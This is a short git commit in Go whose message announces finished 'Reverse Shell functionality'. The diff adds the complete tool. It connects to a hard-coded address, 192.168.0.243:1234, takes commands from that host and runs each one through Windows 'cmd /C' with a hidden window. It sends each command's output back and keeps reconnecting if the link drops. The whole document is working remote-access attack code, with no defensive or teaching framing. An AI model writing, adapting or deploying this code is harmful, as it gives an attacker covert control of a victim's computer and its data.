ff27e4d612247697abd1781441fa12c05ce7ef33
mark haube <markhaube@gmx.de>
2019-01-16 18:12:01 +0100

    Reverse Shell functionality finished.

--- main.go
+++ main.go
@@ -1,5 +1,38 @@
 package main
 
-func main() {
+import (
+	"bufio"
+	"net"
+	"os/exec"
+	"syscall"
+	"time"
+)
 
+func reverse(host string) {
+	c, err := net.Dial("tcp", host)
+	if err != nil {
+		if c != nil {
+			c.Close()
+		}
+		time.Sleep(time.Minute)
+		reverse(host)
+	}
+
+	bufReader := bufio.NewReader(c)
+	for {
+		externCmd, err := bufReader.ReadString('\n')
+		if err != nil {
+			c.Close()
+			reverse(host)
+		}
+		cmd := exec.Command("cmd", "/C", externCmd)
+		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+		out, _ := cmd.CombinedOutput()
+
+		c.Write(out)
+	}
+}
+
+func main() {
+	reverse("192.168.0.243:1234")
 }
